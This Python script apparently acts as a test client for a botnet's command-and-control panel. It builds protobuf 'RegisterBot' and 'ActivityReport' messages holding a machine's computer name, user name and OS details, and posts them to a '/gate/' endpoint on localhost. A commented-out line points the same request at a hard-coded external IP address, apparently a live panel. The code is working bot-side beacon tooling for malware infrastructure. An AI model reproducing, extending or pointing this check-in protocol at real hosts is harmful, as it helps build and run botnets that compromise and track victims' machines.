import requests
import bot_pb2
import struct
from io import StringIO

bot = bot_pb2.BotMsg.RegisterBot()
bot.uid = '123'.encode('utf-16-le')
bot.computername = 'name'.encode('utf-16-le')
bot.username = 'user'.encode('utf-16-le')
bot.os_major = 10
bot.os_minor = 0
bot.is_x64 = True
bot.is_server = True
#r = requests.post(url='http://213.183.51.129:8002/gate/', data='1'.encode('utf-8'))
r = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())

print(r.content, 'text')
_r = bot_pb2.PanelMsg.RegistrationResult()
_r.ParseFromString(r.content)
print(_r)

ar = bot_pb2.BotMsg.ActivityReport()
ar.uid = '1'.encode('utf-16-le')

print(struct.pack('=I', 2) + ar.SerializeToString())

print(ar.SerializeToString())

r = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
print(r.text)
